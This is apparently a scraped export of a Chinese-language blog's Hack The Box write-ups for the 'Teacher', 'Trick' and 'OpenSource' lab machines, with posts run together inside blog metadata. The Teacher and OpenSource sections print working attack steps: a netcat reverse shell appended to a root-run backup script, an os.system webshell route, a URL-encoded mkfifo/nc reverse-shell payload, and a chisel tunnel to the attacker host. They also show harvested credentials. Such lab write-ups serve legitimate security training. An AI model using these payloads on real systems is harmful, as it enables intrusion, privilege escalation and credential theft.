$CFG-&gt;dbuser = &#39;root&#39;; $CFG-&gt;dbpass = &#39;Welkom1!&#39;; $CFG-&gt;prefix = &#39;mdl_&#39;; $CFG-&gt;dboptions = array ( &#39;dbpersist&#39; =&gt; 0, &#39;dbport&#39; =&gt; 3306, &#39;dbsocket&#39; =&gt; &#39;&#39;, &#39;dbcollation&#39; =&gt; &#39;utf8mb4_unicode_ci&#39;, ); $CFG-&gt;wwwroot = &#39;http://teacher.htb/moodle&#39;; $CFG-&gt;dataroot = &#39;/var/www/moodledata&#39;; $CFG-&gt;admin = &#39;admin&#39;; $CFG-&gt;directorypermissions = 0777; require_once(__DIR__ . &#39;/lib/setup.php&#39;); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! 在 &#x2F;var&#x2F;www&#x2F;html&#x2F;moodle&#x2F;config.php 中，找到了数据库的账号密码 $CFG-&gt;dbuser = &#39;root&#39;; $CFG-&gt;dbpass = &#39;Welkom1!&#39;; mysql -h 127.0.0.1 -u root -p Enter password: Welkom1! Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 499 Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1 Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&gt; 成功登入 mysql MariaDB [(none)]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | moodle | | mysql | | performance_schema | | phpmyadmin | +--------------------+ 5 rows in set (0.00 sec) MariaDB [moodle]&gt; show tables; show tables; +----------------------------------+ | Tables_in_moodle | +----------------------------------+ | mdl_user | +----------------------------------+ 388 rows in set (0.00 sec) 表有很多，我就列一个对我们来说有用的了 MariaDB [moodle]&gt; select * from mdl_user; select * from mdl_user| id | auth | confirmed | policyagreed | deleted | suspended | mnethostid | username | password | idnumber | firstname | lastname | email | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin | currentlogin | lastip | secret | picture | url | description | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename || 1 | manual | 1 | 0 | 0 | 0 | 1 | guest | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO | | Guest user | | root@localhost | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 0 | 0 | 0 | 0 | | | 0 | | This user is a special user that allows read-only access to some courses. | 1 | 1 | 0 | 2 | 1 | 0 | 0 | 1530058999 | 0 | NULL | NULL | NULL | NULL | NULL | | 2 | manual | 1 | 0 | 0 | 0 | 1 | admin | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 | | Admin | User | gio@gio.nl | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 1530059097 | 1530059573 | 1530059097 | 1530059307 | 192.168.206.1 | | 0 | | | 1 | 1 | 0 | 1 | 1 | 0 | 0 | 1530059135 | 0 | NULL | | | | | | 3 | manual | 1 | 0 | 0 | 0 | 1 | giovanni | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO | | Giovanni | Chhatta | Giio@gio.nl | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 1530059681 | 1656564818 | 1656558129 | 1656558822 | 10.10.14.2 | | 0 | | | 1 | 1 | 0 | 2 | 1 | 0 | 1530059291 | 1530059291 | 0 | | | | | | | 1337 | manual | 0 | 0 | 0 | 0 | 0 | Giovannibak | 7a860966115182402ed06375cf0a22af | | | | | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 0 | 0 | 0 | 0 | | | 0 | | NULL | 1 | 1 | 0 | 2 | 1 | 0 | 0 | 0 | 0 | NULL | NULL | NULL | NULL | NULL |rows in set (0.00 sec) 最后只有第四个用户的 hash 可以解密出来，看名字是个备份，那用户名应该就是 giovanni 了 username = giovanni password = expelled 这就是我们刚才没有权限访问的那个用户目录了，去切换到这个用户试试 www-data@teacher:/home$ su giovanni su giovanni Password: expelled giovanni@teacher:/home$ whoami&amp;&amp;id whoami&amp;&amp;id giovanni uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni) 成功提权到 user 权限 giovanni@teacher:/home$ cd giovanni cd giovanni giovanni@teacher:~$ ls ls user.txt work giovanni@teacher:~$ cat user.txt cat user.txt 9c991cf63230e31da617d2f1b8bb08d1 成功拿到 user 权限的 flag 文件 Rootgiovanni@teacher:/usr/bin$ cat backup.sh cat backup.sh #!/bin/bash cd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R; 在 &#x2F;usr&#x2F;bin 目录下发现一个名为 bakcup.sh 的脚本 giovanni@teacher:/usr/bin$ ls -la backup.sh ls -la backup.sh -rwxr-xr-x 1 root root 138 Jun 27 2018 backup.sh 权限是 root 用户的，咱们有执行权限，但是没有写入权限 但是这里脚本中有个问题 chmod 777 * -R; 这一句是代表这给所有用户赋予了所有权限，这里就是提权的关键点了 giovanni@teacher:~/work$ ln -s /root ./tmp ln -s /root ./tmp giovanni@teacher:~/work$ ls -la ls -la total 16 drwxr-xr-x 4 giovanni giovanni 4096 Mar 21 15:29 . drwxr-x--- 4 giovanni giovanni 4096 Apr 27 14:59 .. drwxr-xr-x 3 giovanni giovanni 4096 Mar 21 15:29 courses drwxr-xr-x 3 giovanni giovanni 4096 Jun 30 07:33 tmp 首先创建一个软连接，将这个脚本本身给赋予 777 权限 cd /home/giovanni/work/tmp/ rm -rf courses ln -s /usr/bin/ courses 然后我们就有权限对 backup.sh 这个脚本进行修改了 接着使用 nc 再监听一个端口 nc -nvlp 5555 接着写入一个 nc 反弹语句 echo &quot;nc -e /bin/bash 10.10.14.2 5555&quot; &gt;&gt; /usr/bin/backup.sh 然后等着 shell 反弹回来就好了 ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 51910 whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功获得 root 权限 cat /root/root.txt 05d8e3ee43c6af33f80069c615a88e4b 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Trick  - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Trick ","date":"2022-06-18T11:38:36.000Z","updated":"2023-06-17T02:30:06.000Z","comments":true,"path":"2022/06/18/Hackthebox/Easy/Hackthebox-Trick /","link":"","permalink":"http://www.lucifiel.com/2022/06/18/Hackthebox/Easy/Hackthebox-Trick%20/","excerpt":"","text":"Hackthebox - Trick靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.166 Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-19 21:55 EDT Nmap scan report for 10.10.11.166 Host is up (0.22s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA) | 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=32194%PV=Y%DS=2%DC=T%G=Y%TM=62AFD3E OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=B)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 221.19 ms 10.10.14.1 2 221.28 ms 10.10.11.166 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.62 seconds Http 有点不太理解这是什么网站，不过可以有个订阅功能，随便填一个邮箱试试看 给回了个网站，应该是直接提示了使用的框架","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"OpenSource - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-OpenSource","date":"2022-06-07T11:38:36.000Z","updated":"2023-06-13T03:48:04.000Z","comments":true,"path":"2022/06/07/Hackthebox/Easy/Hackthebox-OpenSource/","link":"","permalink":"http://www.lucifiel.com/2022/06/07/Hackthebox/Easy/Hackthebox-OpenSource/","excerpt":"","text":"Hackthebox - OpenSource靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[~] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.164 Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-06 14:49 CST Warning: 10.10.11.164 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.164 Host is up (0.18s latency). Not shown: 62504 closed ports, 3029 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 06 Jun 2022 06:56:05 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | &lt;html lang=&quot;en&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;UTF-8&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; | &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt; | &lt;script src=&quot;/static/vendor/jquery/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt; | &lt;script src=&quot;/static/vendor/popper/popper.min.js&quot;&gt;&lt;/script&gt; | &lt;script src=&quot;/static/vendor/bootstrap/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; | &lt;script src=&quot;/static/js/ie10-viewport-bug-workaround.js&quot;&gt;&lt;/script&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/vendor/bootstrap/css/bootstrap.css&quot;/&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot; /static/vendor/bootstrap/css/bootstrap-grid.css&quot;/&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot; /static/vendor/bootstrap/css/bootstrap-reboot.css&quot;/&gt; | &lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 06 Jun 2022 06:56:06 GMT | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, HEAD, GET | Content-Length: 0 | Connection: close | RTSPRequest: | &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; | &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt; | &lt;html&gt; | &lt;head&gt; | &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; | &lt;title&gt;Error response&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;h1&gt;Error response&lt;/h1&gt; | &lt;p&gt;Error code: 400&lt;/p&gt; | &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt; | &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt; | &lt;/body&gt; |_ &lt;/html&gt; |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=6/6%Time=629DA3F6%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,1573,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Py SF:thon/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x20Jun\\x202022\\x2006:56:05\\x20GMT\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x205 SF:316\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;html\\x20lang=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n\\x20\\ SF:x20\\x20\\x20&lt;meta\\x20charset=\\&quot;UTF-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\ SF:&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scale=1\\.0\\&quot;&gt;\\n SF:\\x20\\x20\\x20\\x20&lt;title&gt;upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free!&lt; SF:/title&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\&quot;/static/vendor/jquery/jquer SF:y-3\\.4\\.1\\.min\\.js\\&quot;&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\&quot;/stati SF:c/vendor/popper/popper\\.min\\.js\\&quot;&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\ SF:x20src=\\&quot;/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\&quot;&gt;&lt;/script&gt;\\n\\x SF:20\\x20\\x20\\x20&lt;script\\x20src=\\&quot;/static/js/ie10-viewport-bug-workaround\\ SF:.js\\&quot;&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href= SF:\\&quot;/static/vendor/bootstrap/css/bootstrap\\.css\\&quot;/&gt;\\n\\x20\\x20\\x20\\x20&lt;lin SF:k\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;\\x20/static/vendor/bootstrap/css/boot SF:strap-grid\\.css\\&quot;/&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20hre SF:f=\\&quot;\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\&quot;/&gt;\\n\\n\\x20\\ SF:x20\\x20\\x20&lt;link\\x20rel=&quot;)%r(HTTPOptions,C7,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\n SF:Server:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x SF:20Jun\\x202022\\x2006:56:06\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20char SF:set=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET\\r\\nContent-Length:\\x200 SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\\x20HTML SF:\\x20PUBLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x204\\.01//EN\\&quot;\\n\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\&quot;http://www\\.w3\\.org/TR/html4/strict\\.dtd\\&quot;&gt;\\n&lt;html&gt;\\n\\x2 SF:0\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-equi SF:v=\\&quot;Content-Type\\&quot;\\x20content=\\&quot;text/html;charset=utf-8\\&quot;&gt;\\n\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20 SF:&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Er SF:ror\\x20response&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code: SF:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20requ SF:est\\x20version\\x20\\(&#39;RTSP/1\\.0&#39;\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20&lt;p&gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20B SF:ad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.&lt;/p&gt;\\n\\x20\\x20\\ SF:x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/6%OT=22%CT=1%CU=35351%PV=Y%DS=2%DC=T%G=Y%TM=629DA462 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 199/tcp) HOP RTT ADDRESS 1 176.47 ms 10.10.14.1 2 177.14 ms 10.10.11.164 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 249.84 seconds Http 似乎是一个什么云平台，根据 Nmap 扫描到的结果 Werkzeug&#x2F;2.1.2 进行搜索，找到了一个路径 &#x2F;console 但是测试了一下，网络上提到的以及 MSF 内的 exp 都没有成功 主页有一个文件可以下载，下载后进行解压 ┌──(root💀kali)-[~/Desktop/source/app/app] └─# cat views.py import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, file_name) f.save(file_path) return render_template(&#39;success.html&#39;, file_url=request.host_url + &quot;uploads/&quot; + file_name) return render_template(&#39;upload.html&#39;) @app.route(&#39;/uploads/&lt;path:path&gt;&#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) 在 &#x2F;source&#x2F;app&#x2F;app&#x2F;views.py 中看到点有趣的内容，http://10.10.11.164/upcloud 然后这边还有一个上传点。 那么我们是否可以伪造 views.py 的内容，然后传上去获得利用呢？ 漏洞利用@app.route(&#39;/exec&#39;) def cmd(): return os.system(request.args.get(&#39;cmd&#39;)) 在 views.py 的最后加上这么一句，然后去上传，使用 burp 进行抓包，然后把我们修改的内容加进去 传上去后查看一下 确定是已经传上去了 但是无法访问和执行，我们去修改一下路径试试 似乎是被 WAF 给拦截了，尝试绕过一下 然后就成功了，去访问一下吧 使用 nc 监听一个端口 然后访问我们的 webshell http://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.33%204444%20%3E%2Ftmp%2Ff 就得到了一个 shell ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.33] from (UNKNOWN) [10.10.11.164] 41083 /bin/sh: can&#39;t access tty; job control turned off /app # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) /app # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:03 inet addr:172.17.0.3 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8217 errors:0 dropped:0 overruns:0 frame:0 TX packets:4351 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:595585 (581.6 KiB) TX bytes:1844757 (1.7 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) 看着不太对，感觉像是在 docker 里 /home # ls -la / total 72 drwxr-xr-x 1 root root 4096 Jun 6 08:06 . drwxr-xr-x 1 root root 4096 Jun 6 08:06 .. -rwxr-xr-x 1 root root 0 Jun 6 08:06 .dockerenv drwxr-xr-x 1 root root 4096 May 4 16:35 app drwxr-xr-x 1 root root 4096 Mar 17 05:52 bin drwxr-xr-x 5 root root 340 Jun 6 08:06 dev drwxr-xr-x 1 root root 4096 Jun 6 08:06 etc drwxr-xr-x 2 root root 4096 May 4 16:35 home drwxr-xr-x 1 root root 4096 May 4 16:35 lib drwxr-xr-x 5 root root 4096 May 4 16:35 media drwxr-xr-x 2 root root 4096 May 4 16:35 mnt drwxr-xr-x 2 root root 4096 May 4 16:35 opt dr-xr-xr-x 233 root root 0 Jun 6 08:06 proc drwx------ 1 root root 4096 May 4 16:35 root drwxr-xr-x 1 root root 4096 Jun 6 08:06 run drwxr-xr-x 1 root root 4096 Mar 17 05:52 sbin drwxr-xr-x 2 root root 4096 May 4 16:35 srv dr-xr-xr-x 13 root root 0 Jun 6 08:06 sys drwxrwxrwt 1 root root 4096 Jun 6 13:33 tmp drwxr-xr-x 1 root root 4096 May 4 16:35 usr drwxr-xr-x 1 root root 4096 May 4 16:35 var 确实是在 docker 里 虚拟机逃逸 https://github.com/jpillora/chisel 这边使用 chisel 来进行逃逸，我们先想办法给弄到靶机里 /dev/shm # wget http://10.10.14.33:8000/chisel Connecting to 10.10.14.33:8000 (10.10.14.33:8000) saving to &#39;chisel&#39; chisel 2% | | 178k 0:00:43 ETA chisel 26% |******** | 2075k 0:00:05 ETA chisel 39% |************ | 3110k 0:00:04 ETA chisel 53% |***************** | 4202k 0:00:03 ETA chisel 69% |********************** | 5495k 0:00:02 ETA chisel 81% |************************** | 6462k 0:00:01 ETA chisel 92% |***************************** | 7327k 0:00:00 ETA chisel 100% |********************************| 7888k 0:00:00 ETA &#39;chisel&#39; saved /dev/shm # ls chisel /dev/shm # ./chisel /bin/sh: ./chisel: Permission denied /dev/shm # ls -la total 7888 drwxrwxrwt 2 root root 60 Jun 6 13:47 . drwxr-xr-x 5 root root 340 Jun 6 08:06 .. -rw-r--r-- 1 root root 8077312 Jun 6 13:46 chisel /dev/shm # chmod 777 chisel /dev/shm # ./chisel /bin/sh: ./chisel: Permission denied 可以看到，在 &#x2F;dev&#x2F;shm 是没有执行权限的，即使给了权限也无法执行 /dev/shm # mv chisel /app /dev/shm # cd /app /app # ls INSTALL.md app chisel public run.py /app # ./chisel Usage: chisel [command] [--help] Version: 1.7.7 (go1.17.6) Commands: server - runs chisel in server mode client - runs chisel in client mode Read more: https://github.com/jpillora/chisel 变通一下，换个位置就可以执行了 这边给出提示了，我们去开启一个 socks5 通道吧 本地 ./chisel server --reverse --port 6969 靶机 ./chisel client 10.10.14.33:6969 R:172.17.0.1:3000 本机 ┌──(root💀kali)-[~/Desktop] └─# ./chisel server --reverse --port 6969 2022/06/06 22:03:03 server: Reverse tunnelling enabled 2022/06/06 22:03:03 server: Fingerprint eok9TFfTK+YpN31Xcx/GZgBfBuElFqfn/SWgZD8lLLU= 2022/06/06 22:03:03 server: Listening on http://0.0.0.0:6969 2022/06/06 22:11:28 server: session#1: tun: proxy#R:3000=&gt;172.17.0.1:3000: Listening 靶机 /app # ./chisel client 10.10.16.2:6969 R:172.17.0.1:3000 2022/06/07 02:11:23 client: Connecting to ws://10.10.16.2:6969 2022/06/07 02:11:27 client: Connected (Latency 276.641246ms) 然后访问 127.0.0.1:3000 成功访问 注册一个账户登入后，在探索的用户里发现有一个名为 dev01 的用户 git show-branch git log dev --oneline git show a76f8f7 使用以上三条命令获取我们要的账户密码 ┌──(root💀kali)-[~/Desktop/source] └─# git show-branch 1 ⚙ ! [dev] ease testing * [public] clean up dockerfile for production use -- * [public] clean up dockerfile for production use + [dev] ease testing + [dev^] added gitignore + [dev~2] updated +* [public^] initial ┌──(root💀kali)-[~/Desktop/source] └─# git log dev --oneline 1 ⚙ c41fede (dev) ease testing be4da71 added gitignore a76f8f7 updated ee9d9f1 initial ┌──(root💀kali)-[~/Desktop/source] └─# git show a76f8f7 1 ⚙ commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser &lt;gituser@local&gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json new file mode 100644 index 0000000..5975e3f --- /dev/null +++ b/app/.vscode/settings.json @@ -0,0 +1,5 @@ +{ + &quot;python.pythonPath&quot;: &quot;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&quot;, + &quot;http.proxy&quot;: &quot;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&quot;, + &quot;http.proxyStrictSSL&quot;: false +} diff --git a/app/app/views.py b/app/app/views.py index f2744c6..0f3cc37 100644 --- a/app/app/views.py +++ b/app/app/views.py @@ -6,7 +6,17 @@ from flask import render_template, request, send_file from app import app -@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) +@app.route(&#39;/&#39;) +def index(): + return render_template(&#39;index.html&#39;) + + +@app.route(&#39;/download&#39;) +def download(): + return send_file(os.path.join(os.getcwd(), &quot;app&quot;, &quot;static&quot;, &quot;source.zip&quot;)) + + +@app.route(&#39;/upcloud&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] @@ -20,4 +30,4 @@ def upload_file(): @app.route(&#39;/uploads/&lt;path:path&gt;&#39;) def send_report(path): path = get_file_name(path) - return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) \\ No newline at end of file + return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) 得到了账号密码 username = dev01 password = Soulless_Developer#2022 然后去登陆一下 Gitea 登陆成功 这边有一个 home-backup 项目，去看看 在里面发现了一个 .ssh 文件夹，看看能不能找到 ssh-key Nice 找到了 